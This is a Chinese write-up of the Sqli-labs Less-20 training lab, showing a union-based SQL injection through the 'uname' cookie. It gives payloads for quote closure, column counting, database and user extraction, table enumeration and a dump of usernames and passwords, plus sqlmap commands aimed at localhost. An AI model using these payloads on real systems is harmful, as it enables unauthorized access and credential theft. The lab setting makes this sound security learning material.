---
title: Sqli-labs Less-20 Writeup
date: 2026-11-19
categories: 渗透测试
tags: [Sqli-labs, SQL注入, Web, Cookie注入, 联合查询]
---
## 一、 漏洞概述
- **关卡**：Less-20
- **漏洞类型**：基于联合查询的 Cookie 注入（Union-Based Cookie SQL Injection）
- **注入点**：HTTP 请求头中的 `Cookie`（`uname` 字段）
- **闭合方式**：单引号 `'`
- **后端语句**：`SELECT * FROM users WHERE username='$cookie_uname' LIMIT 0,1;`

## 二、 渗透测试过程

### 1. 探测注入点与前置条件
访问 Less-20 关卡，首先需要使用已知的账号密码（如 `admin` / `admin`）进行正常登录。
登录成功后，服务器会下发包含 `uname=admin` 的 Cookie，并在页面回显用户的详细信息。

开启 Burp Suite 拦截该页面的刷新请求，找到请求头中的：
`Cookie: uname=admin`
将其修改为带有单引号的测试 payload：
`Cookie: uname=admin'`
放行请求后，页面返回 SQL 语法报错信息，确认 `uname` Cookie 存在单引号 `'` 闭合的字符型注入漏洞，且页面有回显。

### 2. 确定字段数量
修改 Cookie 中的 payload，使用 `ORDER BY` 语句判断字段数。
- **Payload**：
```http
  Cookie: uname=admin' order by 3 #
```

结果：order by 3 页面正常回显，order by 4 页面报错。确认当前查询字段数为 3。

### 3. 确定回显位

使用 UNION SELECT 联合查询，并将前面的查询条件置为假（如使用 -1 或随便填一个不存在的用户），以便页面只显示联合查询的结果。

· Payload：
  ```http
  Cookie: uname=-admin' union select 1,2,3 #
  ```
  结果：页面成功回显数字 1、2、3，说明这三个位置均可作为回显位（通常用户名和密码显示在 2 和 3 的位置）。

### 4. 获取数据库信息

将回显位替换为数据库函数。

· Payload (获取库名与当前用户)：
  ```http
  Cookie: uname=-admin' union select 1,database(),user() #
  ```
  结果：页面回显数据库名为 security，当前用户为 root@localhost。

## 三、 自动化利用 (SQLMap)

使用 SQLMap 时，可以通过 --level 2（及以上）来检测 Cookie 中的注入点，或者手动指定 --cookie 参数：

```bash
# 自动探测 Cookie 注入
sqlmap -u "http://localhost/sqli-labs-master/Less-20/" --cookie="uname=admin" --level 2 --batch --current-db

# 或者明确指定注入点
sqlmap -u "http://localhost/sqli-labs-master/Less-20/" --cookie="uname=admin*" --batch --current-db
```

(注：星号 * 用于明确告诉 SQLMap 在 uname 参数处进行注入测试。)

## 四、 通关 Payload 汇总

所有操作均需在 Burp Suite 中拦截请求并修改 Cookie 头部。

测试目的 Payload (修改 Cookie 中 uname 的值) 备注
测试闭合 admin' 触发报错
判断字段数 admin' order by 3 # 确认字段数为 3
获取库名 -admin' union select 1,database(),3 # 回显 security
获取表名 -admin' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security' # 回显所有表名
获取账号密码 -admin' union select 1,group_concat(username,0x3a,password),3 from users # 回显所有凭证
